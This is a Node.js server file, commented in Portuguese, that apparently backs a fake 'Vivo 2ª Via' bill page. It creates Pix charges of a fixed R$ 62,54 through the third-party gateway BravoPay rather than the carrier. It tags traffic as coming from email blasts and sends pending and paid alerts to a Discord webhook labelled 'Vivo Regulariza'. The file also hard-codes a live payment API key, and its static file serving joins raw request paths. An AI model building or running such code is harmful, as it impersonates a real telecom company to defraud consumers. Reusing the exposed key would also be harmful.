/**
 * Servidor Node.js integrado para Vivo 2ª Via Pix
 * Sem dependências externas (usa módulos nativos do Node: http, https, fs, path, url, crypto)
 * 
 * Para rodar:
 * node server.js
 */

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = process.env.PORT || 3000;
const BRAVOPAY_API_KEY = 'bp_live_mwXI566Lf7nMQDAvJZD8rn5LLzJo6yHGyqSTCg';
const AMOUNT_CENTS = 6254; // R$ 62,54
const BILL_DESCRIPTION = 'Vivo 2ª Via de Fatura Digital';

// Opcional: configure aqui a URL do seu webhook externo (Discord, n8n, Make, Telegram, UTMify, etc.)
const EXTERNAL_WEBHOOK_URL = process.env.WEBHOOK_URL || '';

// Deduplicação de webhooks: armazena IDs de transações já notificadas como PAID
const notifiedPaidIds = new Set();

function log(msg, data) {
    const time = new Date().toISOString();
    console.log(`[${time}] ${msg}`, data ? JSON.stringify(data) : '');
}

// Dispara webhook externo
function dispatchExternalWebhook(event, data) {
    if (!EXTERNAL_WEBHOOK_URL) return;

    try {
        const parsedUrl = new URL(EXTERNAL_WEBHOOK_URL);
        const isDiscord = parsedUrl.hostname.includes('discord.com');
        let bodyPayload;

        if (isDiscord) {
            const isPaid = event === 'pix.approved' || event === 'transaction.paid';
            bodyPayload = {
                embeds: [{
                    title: isPaid ? '✅ PIX PAGO COM SUCESSO! - VIVO' : '⏳ NOVO PIX GERADO (PENDENTE) - VIVO',
                    color: isPaid ? 3066993 : 16753920,
                    fields: [
                        { name: '📧 Cliente / Email', value: data.customer_email || 'Não informado', inline: true },
                        { name: '💰 Valor', value: 'R$ ' + ((data.amount_cents || AMOUNT_CENTS) / 100).toFixed(2).replace('.', ','), inline: true },
                        { name: '🆔 ID da Transação', value: data.transaction_id || 'N/A', inline: false },
                        { name: '⏱ Data/Hora', value: new Date().toLocaleString('pt-BR'), inline: true }
                    ],
                    footer: { text: 'Vivo Regulariza • BravoPay Integration' }
                }]
            };
        } else {
            bodyPayload = {
                event: event,
                timestamp: new Date().toISOString(),
                data: data
            };
        }

        const reqData = JSON.stringify(bodyPayload);
        const client = parsedUrl.protocol === 'https:' ? https : http;
        const req = client.request(parsedUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(reqData)
            }
        });
        req.on('error', (err) => log('Erro ao enviar webhook externo', err.message));
        req.write(reqData);
        req.end();
        log(`Webhook externo disparado [${event}]`, { email: data.customer_email, id: data.transaction_id });
    } catch (e) {
        log('Erro na URL do webhook externo', e.message);
    }
}

// Faz requisições HTTP para a API BravoPay
function callBravoPay(endpoint, method, payload = null) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'bravopay.club',
            port: 443,
            path: `/api/v1${endpoint}`,
            method: method,
            headers: {
                'Authorization': `Bearer ${BRAVOPAY_API_KEY}`,
                'Content-Type': 'application/json'
            }
        };

        const req = https.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                try {
                    const parsed = JSON.parse(body);
                    resolve({ statusCode: res.statusCode, data: parsed });
                } catch (e) {
                    resolve({ statusCode: res.statusCode, raw: body, error: e.message });
                }
            });
        });

        req.on('error', (err) => reject(err));
        if (payload) {
            req.write(JSON.stringify(payload));
        }
        req.end();
    });
}

const mimeTypes = {
    '.html': 'text/html; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.js': 'application/javascript; charset=utf-8',
    '.json': 'application/json; charset=utf-8',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon'
};

const server = http.createServer(async (req, res) => {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;

    // Rota API: Criar PIX (suporta /api/pix e /api.php com action=create_pix)
    if (pathname === '/api/pix' || (pathname === '/api.php' && req.method === 'POST')) {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                let params = {};
                try {
                    params = body ? JSON.parse(body) : {};
                } catch {
                    params = parsedUrl.query || {};
                }

                const email = params.email || 'cliente@vivo.com.br';
                const name = params.name || params.nome || 'Cliente Vivo';
                const cpf = (params.cpf || '').replace(/\D/g, '');
                const externalRef = 'vivo_' + Date.now() + '_' + Math.floor(Math.random() * 9000 + 1000);

                const payload = {
                    amount_cents: AMOUNT_CENTS,
                    method: 'pix',
                    customer: { email, name },
                    description: BILL_DESCRIPTION,
                    external_reference: externalRef,
                    utm: {
                        source: params.utm_source || 'email',
                        medium: params.utm_medium || 'disparo',
                        campaign: params.utm_campaign || 'fatura_vivo',
                        content: params.utm_content || '',
                        term: params.utm_term || '',
                        fbclid: params.fbclid || '',
                        gclid: params.gclid || '',
                        ttclid: params.ttclid || ''
                    }
                };

                if (cpf && cpf.length >= 11) {
                    payload.customer.cpf = cpf;
                }

                log('Criando cobrança Pix no BravoPay...', { email, amount: AMOUNT_CENTS });
                const bpRes = await callBravoPay('/transactions', 'POST', payload);

                if (bpRes.statusCode >= 200 && bpRes.statusCode < 300 && bpRes.data && bpRes.data.id) {
                    const tx = bpRes.data;
                    log('Pix gerado com sucesso!', { id: tx.id, copy_paste: tx.pix?.copy_paste?.substring(0, 30) + '...' });

                    // Dispara Webhook Externo (Pendente)
                    dispatchExternalWebhook('pix.pending', {
                        status: 'PENDING',
                        transaction_id: tx.id,
                        customer_email: email,
                        customer_name: name,
                        amount_cents: AMOUNT_CENTS,
                        copy_paste: tx.pix?.copy_paste || '',
                        expires_at: tx.pix?.expires_at || null,
                        created_at: tx.created_at || new Date().toISOString()
                    });

                    res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
                    res.end(JSON.stringify({
                        success: true,
                        id: tx.id,
                        status: tx.status || 'PENDING',
                        amount_cents: tx.amount_cents || AMOUNT_CENTS,
                        pix: {
                            copy_paste: tx.pix?.copy_paste || '',
                            expires_at: tx.pix?.expires_at || ''
                        },
                        customer: { email, name }
                    }));
                } else {
                    log('Erro na resposta do BravoPay', bpRes);
                    res.writeHead(bpRes.statusCode || 400, { 'Content-Type': 'application/json; charset=utf-8' });
                    res.end(JSON.stringify({
                        error: bpRes.data?.error?.message || 'Erro ao gerar PIX',
                        details: bpRes.data
                    }));
                }
            } catch (err) {
                log('Erro interno no servidor', err);
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: err.message }));
            }
        });
        return;
    }

    // Rota API: Checar Status da Transação
    if (pathname === '/api/check-status' || (pathname === '/api.php' && parsedUrl.query.action === 'check_status')) {
        const id = parsedUrl.query.id;
        if (!id) {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Parâmetro id obrigatório' }));
            return;
        }

        try {
            const bpRes = await callBravoPay(`/transactions/${encodeURIComponent(id)}`, 'GET');
            if (bpRes.statusCode === 200 && bpRes.data && bpRes.data.status) {
                const status = bpRes.data.status.toUpperCase();

                // Deduplicação: só dispara webhook de PAID uma vez por transação
                if (status === 'PAID' && !notifiedPaidIds.has(id)) {
                    notifiedPaidIds.add(id);
                    dispatchExternalWebhook('pix.approved', {
                        status: 'PAID',
                        transaction_id: bpRes.data.id,
                        customer_email: bpRes.data.customer?.email || '',
                        customer_name: bpRes.data.customer?.name || '',
                        amount_cents: bpRes.data.amount_cents || AMOUNT_CENTS,
                        paid_at: bpRes.data.paid_at || new Date().toISOString()
                    });
                }

                res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
                res.end(JSON.stringify({
                    success: true,
                    id: bpRes.data.id,
                    status: status,
                    paid_at: bpRes.data.paid_at || null
                }));
            } else {
                res.writeHead(bpRes.statusCode || 404, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'Transação não encontrada' }));
            }
        } catch (e) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: e.message }));
        }
        return;
    }

    // Rota API: Webhook Receiver (da BravoPay)
    if (pathname === '/api/webhook' || pathname === '/webhook.php') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const payload = JSON.parse(body || '{}');
                log('Webhook recebido da BravoPay', { type: payload.type, id: payload.data?.id });

                if (payload.type === 'transaction.paid') {
                    dispatchExternalWebhook('pix.approved', {
                        status: 'PAID',
                        transaction_id: payload.data?.id,
                        customer_email: payload.data?.customer?.email,
                        amount_cents: payload.data?.amount_cents
                    });
                }

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ received: true }));
            } catch (e) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'Invalid JSON' }));
            }
        });
        return;
    }

    // Servir Arquivos Estáticos (index.html, vivo-logo.png, qrcode.min.js, etc.)
    let filePath = path.join(__dirname, pathname === '/' ? 'index.html' : pathname);
    fs.stat(filePath, (err, stats) => {
        if (err || !stats.isFile()) {
            res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
            res.end('404 Not Found');
            return;
        }

        const ext = path.extname(filePath).toLowerCase();
        const contentType = mimeTypes[ext] || 'application/octet-stream';

        res.writeHead(200, { 'Content-Type': contentType });
        fs.createReadStream(filePath).pipe(res);
    });
});

server.listen(PORT, () => {
    console.log(`====================================================`);
    console.log(` 🚀 Servidor Vivo 2ª Via Pix rodando na porta ${PORT}`);
    console.log(` 🌐 Acesse: http://localhost:${PORT}`);
    console.log(` 📩 Teste com email: http://localhost:${PORT}?email=cliente.vip@gmail.com`);
    console.log(`====================================================`);
});
